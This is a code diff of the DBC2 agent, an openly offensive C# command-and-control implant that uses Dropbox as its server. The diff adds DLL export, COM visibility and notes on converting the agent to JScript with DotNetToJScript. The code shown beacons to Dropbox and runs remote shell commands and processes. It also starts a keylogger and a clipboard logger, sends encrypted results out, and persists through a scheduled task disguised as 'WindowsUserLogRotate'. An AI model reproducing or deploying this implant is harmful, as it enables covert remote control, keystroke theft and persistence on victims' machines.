@@ -1,17 +1,29 @@
 ﻿/*
 Author: Arno0x0x, Twitter: @Arno0x0x
 
--------------------- x64 platform ----------------
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:dbc2_agent.exe *.cs
+================================ Compile as an EXE for x64 platform ==============================
+	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:dbc2_agent.exe *.cs
 
 Or, with debug information:
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_agent_debug.exe *.cs
+	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_agent_debug.exe *.cs
 
--------------------- x86 platform ----------------
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:dbc2_agent.exe *.cs
+================================ Compile as an EXE for x86 platform ==============================
+	C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:dbc2_agent.exe *.cs
 
 Or, with debug information:
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_agent_debug.exe *.cs
+	C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_agent_debug.exe *.cs
+
+================================ Compile as a .Net DLL for x86 platform ==============================
+Can be used with DotNetToJScript:
+	C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:dbc2_agent.dll *.cs
+
+Then:
+	DotNetToJScript.exe --ver=auto -l JScript -c dropboxc2.C2_Agent dbc2_agent.dll > dbc2.js
+
+===================== Compile as a DLL with exported function for unmanaged code =================
+This requires the use of the RGiesecke.DllExport nugget package. Code must be compiled from VisualStudio
+with the DLLEXPORT defined flag
+
 */
 
 using System;
@@ -21,16 +33,25 @@ using System.Text;
 using System.Management;
 using System.Net.NetworkInformation;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+#if (DLLEXPORT)
+using RGiesecke.DllExport;
+#endif
 
 namespace dropboxc2
 {
     //****************************************************************************************
     // Main class
     //****************************************************************************************
+	[ComVisible(true)]
     public class C2_Agent
     {
         //--------------------------------------------------------------------------------------------------
         // Class global variables
+		string accessToken = String.Empty;
+        byte[] cryptoKey;
+		
         Mutex mutex = null; // Mutex used to ensure there's only one agent running at a time
         int pollingPeriod = 8000; // Nominal polling period in milliseconds
         int deviation = 20; // Deviation is a percentage of variation around the polling period
@@ -50,39 +71,50 @@ namespace dropboxc2
         private static StringBuilder shellOutput = new StringBuilder();
         int savedPollingPeriod = 0;
         int savedDeviation = 0;
-
+		
+		//==================================================================================================
+        // Constructors of the DBC2 agent
         //==================================================================================================
-        // Main program function
-        //==================================================================================================
-        public static void Main(string[] args)
-        {   
-            string accessToken = String.Empty;
-            byte[] cryptoKey;
-
-            //---------------------------------------------------------------------
+		public C2_Agent(string[] args) 
+		{
+			//---------------------------------------------------------------------
             // Check arguments have been passed
             if (args.Length == 2)
             {
                 // Retrieve AccessToken and CryptoKey from passed arguments
                 accessToken = args[0];
-                cryptoKey = Convert.FromBase64String(args[1]);    
+                cryptoKey = Convert.FromBase64String(args[1]);
+				Run();
             }
             else
             {
+				// If missing arguments, we should return....
                 return;
             }
-            
+		}
 
-            //---------------------------------------------------------------------
-            // Create an instance of the C2_Agent
-            C2_Agent c2_agent = new C2_Agent();
-            
+        //==================================================================================================
+        // Static entry point for the program as an executable, also exported for use as a DLL
+        //==================================================================================================
+#if (DLLEXPORT)
+        [DllExport("dbc2", CallingConvention = CallingConvention.Cdecl)]
+#endif
+        public static void Main(string[] args)
+        {
+			C2_Agent c2_agent = new C2_Agent(args);
+		}
+		
+		//==================================================================================================
+        // Main function
+        //==================================================================================================
+		private void Run()
+		{
             // Get a unique ID for the machine this agent is running on
-            c2_agent.agentID = c2_agent.createAgentID();
-            c2_agent.mutex = new Mutex(false, @"Global\" + c2_agent.agentID);
+            agentID = createAgentID();
+            mutex = new Mutex(false, @"Global\" + agentID);
 
             // Check if another instance of an agent is already running
-            if(!c2_agent.mutex.WaitOne(0, false))
+            if(!mutex.WaitOne(0, false))
             {
 #if (DEBUG)
                 Console.WriteLine("[ERROR] Another instance of the agent is already running");
@@ -99,8 +131,8 @@ namespace dropboxc2
             bool breakFlag = false;
 
             
-            c2_agent.c2StatusFile = "/" + c2_agent.agentID + ".status";
-            c2_agent.c2CmdFile = "/" + c2_agent.agentID + ".cmd";
+            c2StatusFile = "/" + agentID + ".status";
+            c2CmdFile = "/" + agentID + ".cmd";
 
             // Initializing a DropboxHandler object to handle all communications with the Dropbox C2 server
             DropboxHandler dropboxHandler = new DropboxHandler(accessToken);
@@ -111,10 +143,10 @@ namespace dropboxc2
 
             // Create the c2StatusFile and c2CmdFile on the Dropbox server. These files act as an unique identifier for this agent
             // as well as a receiver for commands from the server
-            c2_agent.c2CmdFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2CmdFile, Encoding.ASCII.GetBytes(""));
-            c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(""));
+            c2CmdFileLastRevNumber = dropboxHandler.putFile(c2CmdFile, Encoding.ASCII.GetBytes(""));
+            c2StatusFileLastRevNumber = dropboxHandler.putFile(c2StatusFile, Encoding.ASCII.GetBytes(""));
 
-            if (c2_agent.c2StatusFileLastRevNumber == String.Empty || c2_agent.c2CmdFileLastRevNumber == String.Empty)
+            if (c2StatusFileLastRevNumber == String.Empty || c2CmdFileLastRevNumber == String.Empty)
             {
 #if (DEBUG)
                 Console.WriteLine("[Main][ERROR] Cannot create files on the C2 server");
@@ -129,7 +161,7 @@ namespace dropboxc2
             }
 
             // Set initial sleep time to the nominal polling period with a deviation
-            c2_agent.sleepTime = c2_agent.getRandomPeriod();
+            sleepTime = getRandomPeriod();
 
             //---------------------------------------------------------------------------------
             // Main loop
@@ -137,20 +169,20 @@ namespace dropboxc2
             while (!breakFlag)
             {
 #if (DEBUG)
-                Console.WriteLine("[Main loop] Going to sleep for " + c2_agent.sleepTime / 1000 + " seconds");
+                Console.WriteLine("[Main loop] Going to sleep for " + sleepTime / 1000 + " seconds");
 #endif
                 // Wait for the polling period to time out
-                Thread.Sleep(c2_agent.sleepTime);
+                Thread.Sleep(sleepTime);
 #if (DEBUG)
                 Console.WriteLine("[Main loop] Waking up");
 #endif
 
                 // Calculate next sleep time
-                c2_agent.sleepTime = c2_agent.getRandomPeriod();
+                sleepTime = getRandomPeriod();
 
                 //----------------------------------------------------------------------------
                 // Check if we're in shellMode
-                if (c2_agent.shellMode)
+                if (shellMode)
                 {
                     // So we're in shell mode, is there some shell output to push to the C2 ?
                     int currentLength = shellOutput.Length;
@@ -158,16 +190,16 @@ namespace dropboxc2
                     {
                         string output = shellOutput.ToString(0, currentLength);
                         shellOutput.Remove(0, currentLength);
-                        dropboxHandler.putFile("/" + c2_agent.agentID + ".dd", Crypto.EncryptData(Encoding.UTF8.GetBytes(output), cryptoKey));
+                        dropboxHandler.putFile("/" + agentID + ".dd", Crypto.EncryptData(Encoding.UTF8.GetBytes(output), cryptoKey));
                     }
                 }
 
                 //----------------------------------------------------------------------------
                 // At each cycle, 'touch' the status file to show the agent is alive = beaconing
-                c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes("READY - " + DateTime.Now.ToString()));
+                c2StatusFileLastRevNumber = dropboxHandler.putFile(c2StatusFile, Encoding.ASCII.GetBytes("READY - " + DateTime.Now.ToString()));
 
                 // Check the c2 command File revision number
-                string revNumber = dropboxHandler.getRevNumber(c2_agent.c2CmdFile);
+                string revNumber = dropboxHandler.getRevNumber(c2CmdFile);
                 if (revNumber == String.Empty)
                 {
 #if (DEBUG)
@@ -179,16 +211,16 @@ namespace dropboxc2
 
                 //----------------------------------------------------------------------------
                 // If the revision number is different, that means there's a new command to be treated
-                if (revNumber != c2_agent.c2CmdFileLastRevNumber)
+                if (revNumber != c2CmdFileLastRevNumber)
                 {
 #if (DEBUG)
                     Console.WriteLine("[Main loop] Command file has a new revision number: [" + revNumber + "]");
 #endif
 
-                    c2_agent.c2CmdFileLastRevNumber = revNumber;
+                    c2CmdFileLastRevNumber = revNumber;
 
                     // Read the content of the C2 file
-                    string content = Encoding.UTF8.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2_agent.c2CmdFile), cryptoKey));
+                    string content = Encoding.UTF8.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2CmdFile), cryptoKey));
                     if (content == String.Empty)
                     {
 #if (DEBUG)
@@ -203,7 +235,7 @@ namespace dropboxc2
                     string result = String.Empty;
                     string command = strReader.ReadLine();
                     string taskID = strReader.ReadLine();
-                    string taskResultFile = "/" + c2_agent.agentID + "." + taskID;
+                    string taskResultFile = "/" + agentID + "." + taskID;
 
 #if (DEBUG)
                     Console.WriteLine("[Main loop] Command to execute: [" + command + "]");
@@ -216,14 +248,14 @@ namespace dropboxc2
                     {
                         case "shell":
                             string shellCommand = strReader.ReadLine();
-                            c2_agent.shellMode = true;
+                            shellMode = true;
 
 #if (DEBUG)
                             Console.WriteLine("\t[shell] Executing: [" + shellCommand + "]");
 #endif
 
                             // Send the command to the child process
-                            c2_agent.runShell(shellCommand);
+                            runShell(shellCommand);
                             break;
 
                         case "runCLI":
@@ -234,7 +266,7 @@ namespace dropboxc2
 #endif
 
                             // Execute the command
-                            result = c2_agent.runCMD(commandLine);
+                            result = runCMD(commandLine);
 
                             if (result == null)
                             {
@@ -257,7 +289,7 @@ namespace dropboxc2
 #endif
 
                             // Execute the command
-                            if (c2_agent.launchProcess(exeName, arguments))
+                            if (launchProcess(exeName, arguments))
                             {
                                 result = "OK - PROCESS STARTED: " + exeName + arguments;
                             } else
@@ -341,11 +373,11 @@ namespace dropboxc2
                             break;
 
                         case "sleep":
-                            int sleepTime;
+                            int requestedSleepTime;
                             string value = strReader.ReadLine();
-                            if (Int32.TryParse(value, out sleepTime))
+                            if (Int32.TryParse(value, out requestedSleepTime))
                             {
-                                c2_agent.sleepTime = sleepTime * 60 * 1000;
+                                sleepTime = requestedSleepTime * 60 * 1000;
 
 #if (DEBUG)
                                 Console.WriteLine("\t[sleep] Next sleep is: " + sleepTime + " minute(s)");
@@ -355,7 +387,7 @@ namespace dropboxc2
                                 DateTime wakeUpTime = DateTime.Now.AddMinutes(sleepTime);
                                 result = "SLEEPING" + "," + wakeUpTime.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ");
 
-                                c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(result));
+                                c2StatusFileLastRevNumber = dropboxHandler.putFile(c2StatusFile, Encoding.ASCII.GetBytes(result));
                             } else
                             {
 #if (DEBUG)
@@ -369,16 +401,16 @@ namespace dropboxc2
                             break;
 
                         case "polling":
-                            int period, deviation;
+                            int requestedPeriod, requestDeviation;
                             string value1 = strReader.ReadLine();
                             string value2 = strReader.ReadLine();
-                            if (Int32.TryParse(value1, out period) && Int32.TryParse(value2, out deviation))
+                            if (Int32.TryParse(value1, out requestedPeriod) && Int32.TryParse(value2, out requestDeviation))
                             {
-                                c2_agent.pollingPeriod = period * 1000;
-                                c2_agent.deviation = deviation;
+                                pollingPeriod = requestedPeriod * 1000;
+                                deviation = requestDeviation;
 
 #if (DEBUG)
-                                Console.WriteLine("\t[polling] Polling period changed to {0}s with a deviation of {1}% ", period, deviation);
+                                Console.WriteLine("\t[polling] Polling period changed to {0}s with a deviation of {1}% ", pollingPeriod, deviation);
 #endif
 
                                 result = "OK - PERIOD AND DEVIATION CHANGED";
@@ -422,10 +454,10 @@ namespace dropboxc2
 
                             if (action == "start")
                             {
-                                c2_agent.keylogged = new StringBuilder();
+                                keylogged = new StringBuilder();
                                 // Start the keylogging function
-                                KeyLogger.OnKeyDown += key => { c2_agent.keylogged.Append("d[" + key + "]\n"); };
-                                KeyLogger.OnKeyUp += key => { c2_agent.keylogged.Append("u[" + key + "]\n"); };
+                                KeyLogger.OnKeyDown += key => { keylogged.Append("d[" + key + "]\n"); };
+                                KeyLogger.OnKeyUp += key => { keylogged.Append("u[" + key + "]\n"); };
                                 KeyLogger.Start();
 #if (DEBUG)
                                 Console.WriteLine("\t[keylogger] KeyLogger started");
@@ -436,8 +468,8 @@ namespace dropboxc2
                             else
                             {
                                 KeyLogger.Stop();
-                                result = c2_agent.keylogged.ToString();
-                                c2_agent.keylogged.Clear();
+                                result = keylogged.ToString();
+                                keylogged.Clear();
 #if (DEBUG)
                                 Console.WriteLine("\t[keylogger] KeyLogger stopped");
 #endif
@@ -452,9 +484,9 @@ namespace dropboxc2
 
                             if (action == "start")
                             {
-                                c2_agent.clipboardLogged = new StringBuilder();
+                                clipboardLogged = new StringBuilder();
                                 // Start the keylogging function
-                                ClipboardLogger.OnKeyBoardEvent += text => { c2_agent.clipboardLogged.Append(text+"\n");};
+                                ClipboardLogger.OnKeyBoardEvent += text => { clipboardLogged.Append(text+"\n");};
                                 ClipboardLogger.Start();
 #if (DEBUG)
                                 Console.WriteLine("\t[clipboardlogger] Clipboard Logger started");
@@ -465,8 +497,8 @@ namespace dropboxc2
                             else
                             {
                                 ClipboardLogger.Stop();
-                                result = c2_agent.clipboardLogged.ToString();
-                                c2_agent.clipboardLogged.Clear();
+                                result = clipboardLogged.ToString();
+                                clipboardLogged.Clear();
 #if (DEBUG)
                                 Console.WriteLine("\t[clipboardlogger] Clipboard logger stopped");
 #endif
@@ -524,7 +556,7 @@ namespace dropboxc2
                             System.IO.File.WriteAllText(filePath, oneLiner);
 
                             commandLine = "schtasks /create /TN 'WindowsUserLogRotate' /TR '" + filePath +"' /SC ONIDLE /i 20";
-                            result = c2_agent.runCMD(commandLine);
+                            result = runCMD(commandLine);
 
                             // Push the command result to the C2 server
                             dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.UTF8.GetBytes(result), cryptoKey));
